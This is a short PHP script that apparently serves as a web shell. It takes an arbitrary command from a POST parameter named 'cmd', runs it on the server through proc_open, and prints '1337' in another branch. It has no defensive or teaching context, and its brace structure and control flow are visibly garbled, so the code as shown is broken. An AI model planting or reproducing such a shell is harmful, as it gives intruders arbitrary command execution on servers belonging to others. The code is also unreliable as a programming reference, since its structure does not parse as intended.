<?php
  if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    
  function exec_cmd($command){
    {
      $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("file", "error.txt", "a")
      );
      $cwd = '';
      $env = array('some_option' => 'leo');
      $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
      if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
        return $output;
      }exec_cmd($cmd); exit;
    }else{
      echo "1337";
    }
  }
  }
?>
